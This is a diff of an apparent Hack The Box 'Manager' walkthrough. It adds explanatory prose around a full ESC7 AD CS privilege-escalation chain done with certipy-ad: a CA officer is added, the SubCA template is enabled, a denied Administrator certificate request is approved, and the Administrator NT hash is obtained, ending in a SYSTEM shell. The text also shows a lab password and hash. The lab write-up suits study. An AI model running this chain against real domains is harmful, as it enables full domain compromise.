@@ -692,13 +692,13 @@ The following steps showcase the exploitation of ESC7:
 certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -add-officer raven
 ```
 
-Leveraging Raven's ManageCA rights, she elevates her permissions to become someone who can approve certificate requests.
-
 #### Output:
 
 ```
 [*] Successfully added officer 'Raven' on 'manager-DC01-CA'
 ```
+
+Leveraging Raven's ManageCA rights, she elevates her permissions to become someone who can approve certificate requests.
 
 #### Enable the SubCA template:
 
@@ -706,21 +706,19 @@ Leveraging Raven's ManageCA rights, she elevates her permissions to become someo
 certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -enable-template SubCA
 ```
 
-Raven enables the SubCA template, that allows requesting certificates for any particular user using a UPN, rather than predefined users used in other templates.
-
 #### Output:
 
 ```
 [*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
 ```
 
+Raven enables the SubCA template, that allows requesting certificates for any particular user using a UPN, rather than predefined users used in other templates.
+
 #### Request Administrator's certificate:
 
 ```
 certipy-ad req -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -template SubCA -upn administrator@manager.htb
 ```
-
-
 
 #### Output:
 
@@ -734,7 +732,7 @@ Would you like to save the private key? (y/N): y
 [-] Failed to request certificate
 ```
 
-This fails but we must take note of the Request ID, which is 19 in this case.
+Raven requests a certificate for the Administrator user, but it is denied. However, the request is filed away and can be accessed using a request ID, which we importantly take note of.
 
 #### Override the rejection and Approve the Certificate Request:
 
@@ -747,6 +745,8 @@ certipy-ad ca -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!
 ```
 [*] Successfully issued certificate request ID 19
 ```
+
+Because we elected Raven to become an officer in step 1, we are granted the ability to approve pending/rejected requests. We therefore approve request number 19, and an administrator certificate is issued to us.
 
 #### Retrieve the issued certificate:
 
@@ -765,6 +765,8 @@ certipy-ad req -dc-ip 10.129.116.131 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r
 [*] Saving certificate and private key to 'administrator.pfx'
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
+
+The CA checks the request is approved and hands over a certificate.
 
 #### Authenticate using the certificate:
 
@@ -812,6 +814,8 @@ certipy-ad auth -dc-ip 10.129.116.131 -pfx administrator.pfx
 [*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
 ```
 
+We authenticate to the Domain Controller using the certificate and because it believes we are the Administrator, it hands us the NT Hash. 
+
 #### Log in using NT hash:
 
 ```
@@ -835,4 +839,4 @@ C:\Windows\system32> whoami
 nt authority\system
 ```
 
-And that is the end of this machine!
+Finally, we log into the Domain Controller using the NT hash of the Administrator, and that is the end of this machine.
